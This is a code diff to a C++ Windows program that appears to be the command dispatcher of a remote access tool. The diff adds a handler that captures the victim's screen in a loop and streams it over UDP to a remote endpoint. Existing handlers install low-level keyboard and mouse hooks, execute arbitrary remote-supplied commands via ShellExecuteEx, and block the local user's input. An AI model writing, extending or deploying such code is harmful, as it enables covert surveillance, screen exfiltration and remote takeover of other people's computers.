@@ -1,17 +1,21 @@
 #include "..\Service\pch.hpp"
 
 #include "CommandProperties.hpp"
+#include "..\Network\UDPParticipiant.hpp"
+#include "..\Capturing\ScreenCapturer.hpp"
 
 const std::array<CommandProperties, static_cast<size_t>(Commands::NUMBER_OF_COMMANDS)> COMMAND_PROPERTIES
 { {
-	{ std::make_tuple(Commands::MESSAGEBOX,       "message"), _onCmd_MESSAGEBOX       },
-	{ std::make_tuple(Commands::KEYBOARDCTRL_ON,  "kbon"),    _onCmd_KEYBOARDCTRL_ON  },
-	{ std::make_tuple(Commands::KEYBOARDCTRL_OFF, "kboff"),   _onCmd_KEYBOARDCTRL_OFF },
-	{ std::make_tuple(Commands::MOUSECTRL_ON,     "mon"),     _onCmd_MOUSECTRL_ON     },
-	{ std::make_tuple(Commands::MOUSECTRL_OFF,    "moff"),    _onCmd_MOUSECTRL_OFF    },
-	{ std::make_tuple(Commands::EXECUTECMD,       "cmd"),     _onCmd_EXECUTECMD       },
-	{ std::make_tuple(Commands::BLOCKINPUT_ON,    "bion"),    _onCmd_BLOCKINPUT_ON    },
-	{ std::make_tuple(Commands::BLOCKINPUT_OFF,   "bioff"),   _onCmd_BLOCKINPUT_OFF   }
+	{ std::make_tuple(Commands::MESSAGEBOX,        "message"), _onCmd_MESSAGEBOX        },
+	{ std::make_tuple(Commands::VIEWDESKTOP_START, "vdstart"), _onCmd_VIEWDESKTOP_START },
+	{ std::make_tuple(Commands::VIEWDESKTOP_STOP,  "vdstop"),  _onCmd_VIEWDESKTOP_STOP  },
+	{ std::make_tuple(Commands::KEYBOARDCTRL_ON,   "kbon"),    _onCmd_KEYBOARDCTRL_ON   },
+	{ std::make_tuple(Commands::KEYBOARDCTRL_OFF,  "kboff"),   _onCmd_KEYBOARDCTRL_OFF  },
+	{ std::make_tuple(Commands::MOUSECTRL_ON,      "mon"),     _onCmd_MOUSECTRL_ON      },
+	{ std::make_tuple(Commands::MOUSECTRL_OFF,     "moff"),    _onCmd_MOUSECTRL_OFF     },
+	{ std::make_tuple(Commands::EXECUTECMD,        "cmd"),     _onCmd_EXECUTECMD        },
+	{ std::make_tuple(Commands::BLOCKINPUT_ON,     "bion"),    _onCmd_BLOCKINPUT_ON     },
+	{ std::make_tuple(Commands::BLOCKINPUT_OFF,    "bioff"),   _onCmd_BLOCKINPUT_OFF    }
 } };
 
 namespace detail
@@ -84,7 +88,7 @@ namespace detail
 
 #pragma region Functions
 
-bool _onCmd_MESSAGEBOX(const std::vector<std::string> &args)
+bool _onCmd_MESSAGEBOX(const args_t &args)
 {
 	if(args.size() != 1ull)
 		return false;
@@ -92,7 +96,29 @@ bool _onCmd_MESSAGEBOX(const std::vector<std::string> &args)
 	return (MessageBoxA(nullptr, args[0].c_str(), "MESSAGE", MB_ICONERROR | MB_OK | MB_SYSTEMMODAL) != 0);
 }
 
-bool _onCmd_KEYBOARDCTRL_ON(const std::vector<std::string> &args)
+void _onCmd_VIEWDESKTOP_START(const args_t &args, cip_t &cip, size_t pos, boost::asio::io_context &io_context, const boost::asio::ip::udp::endpoint &endpoint) //-V2009
+{
+	UDPParticipiant server(io_context, endpoint);
+	ScreenCapturer scapt;
+	while (cip[pos])
+	{	
+		scapt.capture();
+
+		IMPROTO msg;
+		msg.set_body_length(scapt.get_data_size());
+		std::memcpy(msg.get_body(), scapt.get_data(), msg.get_body_length());
+		msg.encode_header(IMPROTO::CHUNK_SIZE);
+
+		server.send(msg);
+	}
+}
+
+void _onCmd_VIEWDESKTOP_STOP(const args_t&, cip_t &cip, size_t pos, boost::asio::io_context&, const boost::asio::ip::udp::endpoint&)
+{
+	cip[pos] = false;
+}
+
+bool _onCmd_KEYBOARDCTRL_ON(const args_t &args)
 {
 	if (!detail::hooks::data::keyboardHook)
 		detail::hooks::data::keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, detail::hooks::LowLevelKeyboardProc, nullptr, 0ul);
@@ -103,12 +129,12 @@ bool _onCmd_KEYBOARDCTRL_ON(const std::vector<std::string> &args)
 	return true;
 }
 
-bool _onCmd_KEYBOARDCTRL_OFF(const std::vector<std::string>&)
+bool _onCmd_KEYBOARDCTRL_OFF(const args_t&)
 {
 	return UnhookWindowsHookEx(detail::hooks::data::keyboardHook);;
 }
 
-bool _onCmd_MOUSECTRL_ON(const std::vector<std::string> &args)
+bool _onCmd_MOUSECTRL_ON(const args_t &args)
 {
 	if(!detail::hooks::data::mouseHook)
 		detail::hooks::data::mouseHook = SetWindowsHookEx(WH_MOUSE_LL, detail::hooks::LowLevelMouseProc, nullptr, 0ul);
@@ -116,18 +142,18 @@ bool _onCmd_MOUSECTRL_ON(const std::vector<std::string> &args)
 	int   x{},
 		  y{};
 	DWORD button{};
-	if (sscanf_s(args[0].c_str(), "%d %d %u", &x, &y, &button) == 3 && !detail::emulator::SendMouseInput(button))
+	if (sscanf_s(args[0].c_str(), "%d %d %ul", &x, &y, &button) == 3 && !detail::emulator::SendMouseInput(button))
 		return false;
 
 	return SetCursorPos(x, y);
 }
 
-bool _onCmd_MOUSECTRL_OFF(const std::vector<std::string>&)
+bool _onCmd_MOUSECTRL_OFF(const args_t&)
 {
 	return UnhookWindowsHookEx(detail::hooks::data::mouseHook);
 }
 
-bool _onCmd_EXECUTECMD(const std::vector<std::string> &args)
+bool _onCmd_EXECUTECMD(const args_t &args)
 {
 	std::string params;
 	for (auto &&arg : args)
@@ -143,12 +169,12 @@ bool _onCmd_EXECUTECMD(const std::vector<std::string> &args)
 	return ShellExecuteEx(&sei);
 }
 
-bool _onCmd_BLOCKINPUT_ON(const std::vector<std::string>&)
+bool _onCmd_BLOCKINPUT_ON(const args_t&)
 {
 	return BlockInput(true);
 }
 
-bool _onCmd_BLOCKINPUT_OFF(const std::vector<std::string>&)
+bool _onCmd_BLOCKINPUT_OFF(const args_t&)
 {
 	return BlockInput(false);
 }
